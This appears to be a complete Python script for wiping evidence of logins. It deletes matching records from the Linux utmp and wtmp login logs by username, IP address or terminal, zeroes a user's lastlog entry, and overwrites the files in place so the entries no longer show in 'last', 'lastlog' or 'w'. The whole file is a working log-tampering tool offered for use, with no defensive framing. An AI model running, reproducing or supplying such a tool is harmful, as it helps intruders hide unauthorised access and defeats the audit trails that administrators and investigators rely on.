# -*- coding:utf-8 -*-

import struct
import pwd
import argparse
import sys
import os
import time


def wrapper(func):
    def _wrapper():
        try:
            matched, tamperlog = func()
            if matched:
                Print(put_color("[*]found matched log in ", "yellow")+FILENAME, level=1)
                for i in matched:
                    Print(put_color(i, "white"), level=1)
                if vars(__builtins__).get('raw_input', input)(put_color("\n[!]clean them?", "white")+" [y]/n > ") != "n":
                    return tamperlog
                else:
                    Print(put_color("  [!]aborted", "yellow"), level=1)
            else:
                Print(put_color("[*]records not found!", "green"), level=1)
        except Exception as e:
            Print("%s %s %s" % (put_color("\n[X]match log:", "red"), FILENAME, put_color("failed", "red")), level=0)
            Print("  [-]reason: %s" % put_color(str(e), "white"), level=0)
    return _wrapper


@wrapper
def match_xmtplog():
    '''
    open xtmp/lastlog logfile and search for record.
    return **unmatched** record.
    '''

    tamperlog = b''
    matched = []
    with open(FILENAME, 'rb') as fp:
        while 1:
            bytes = fp.read(SIZE)
            if not bytes:
                break

            record = [str(i) if type(i) == int else i.replace(b"\0", b"") for i in struct.unpack(STRUCT, bytes)]
            if all([compare(clues[0], record[4]),  # search username
                    compare(clues[1], record[5]),  # search ip
                    compare(clues[2], record[2])]):  # search ttyname
                matched.append("  [-]"+b" ".join([record[4], record[2], record[5]]).decode("utf8"))
                continue

            tamperlog += bytes

    return matched, tamperlog


@wrapper
def match_lastlog():
    matched = []
    try:
        pw = pwd.getpwnam(USERNAME)
        Print(put_color("[-]user found", "gray"), level=2)
    except:
        Print(put_color("[!]user not found!", "yellow"), level=1)
        return [], ""

    with open(FILENAME, 'rb') as fp:
        bytes = fp.read()
        fp.seek(SIZE*pw.pw_uid)
        matched_bytes = fp.read(SIZE)
        if matched_bytes:
            tamperlog = bytes.replace(matched_bytes, struct.pack(STRUCT, 0, b"\x00"*32, b"\x00"*64))
            record = [str(i) if type(i) == int else i.replace(b"\0", b"") for i in struct.unpack(STRUCT, matched_bytes)]

            if int(record[0]):
                matched = ["  [-]"+" ".join([
                    USERNAME,
                    record[1].decode("utf8"),
                    time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(int(record[0]))),
                    record[2].decode("utf8"),
                ])]

    return matched, tamperlog


def tamper_log(contents):
    '''
    tamper the log files.
    '''
    try:
        with open(FILENAME, 'wb') as fp:
            fp.write(contents)
        Print(put_color("  [-]success!", "green"), level=1)
    except Exception as e:
        Print("%s %s %s" % (put_color("\n[X]tamper log:", "red"), FILENAME, put_color("failed", "red")), level=0)
        Print("  [-]reason: %s" % put_color(str(e), "white"), level=0)


def compare(a, b):
    '''
    unassigned == None == True
    '''

    return a == None or a.encode('utf-8') == b


def put_color(string, color):
    colors = {
        u"gray": "2",
        u"red": "31",
        u"green": "32",
        u"yellow": "33",
        u"blue": "34",
        u"pink": "35",
        u"cyan": "36",
        u"white": "37",
    }

    return u"\033[40;1;%s;40m%s\033[0m" % (colors[color], string)


def Print(msg, level):
    '''
    control output

    level 0: important info
    level 1: normal info
    level 2: debug info
    '''

    if level <= VERBOSE:
        print(msg)


PATH = [
    "/var/run/utmp",
    "/var/log/wtmp",
    "/var/log/lastlog"
]

parser = argparse.ArgumentParser()
parser.add_argument('-m', '--mode', type=int, required=True,
                    choices=[0, 1, 2], help='assign log file: [0:utmp]; 1:wtmp; 2:lastlog')

parser.add_argument('-u', '--username', help='match records based on username')
parser.add_argument('-i', '--ip', help='match records based on ip')
parser.add_argument('-t', '--ttyname', help='match records based on ttyname')

parser.add_argument('-f', '--filename', help='match records based on filename')
parser.add_argument('-v', '--verbose', default=1, type=int,
                    choices=[0, 1, 2], help='how much information you want: 0:silent; [1]; 2:debug')

args = parser.parse_args()
MODE = args.mode

USERNAME = args.username
IP = args.ip
TTYNAME = args.ttyname

FILENAME = args.filename if args.filename else PATH[MODE]
VERBOSE = args.verbose

PATH = [
    "/var/run/utmp",
    "/var/log/wtmp",
    "/var/log/lastlog"
]

LASTLOG_STRUCT = 'I32s256s'
LASTLOG_STRUCT_SIZE = struct.calcsize(LASTLOG_STRUCT)

XTMP_STRUCT = 'hi32s4s32s256shhiii4i20x'
XTMP_STRUCT_SIZE = struct.calcsize(XTMP_STRUCT)

STRUCT = [LASTLOG_STRUCT, XTMP_STRUCT][MODE in [0, 1]]
SIZE = [LASTLOG_STRUCT_SIZE, XTMP_STRUCT_SIZE][MODE in [0, 1]]

if not os.geteuid() == 0:
    if vars(__builtins__).get('raw_input', input)(put_color("[!]you are NOT ROOT", "red")+"\n  [-]continue? y/[n] > ") != "y":
        sys.exit(put_color("  [!]aborted", "yellow"))
    else:
        Print(put_color("  [-]as you wish\n", "yellow"), level=0)


if MODE in [0, 1]:
    clues = [USERNAME, IP, TTYNAME]
    if not any(clues):  # clues is empty!
        sys.exit(put_color("[X]give me a username or ip or ttyname", "red"))

    # 0: change command: last
    # 1: change command: lastlog
    new_data = match_xmtplog()
    if new_data != None:
        tamper_log(new_data)
else:
    # 2: change command: w
    if not USERNAME:  # clues is username!
        sys.exit(put_color("[X]give me a username", "red"))

    new_data = match_lastlog()
    if new_data != None:
        tamper_log(new_data)
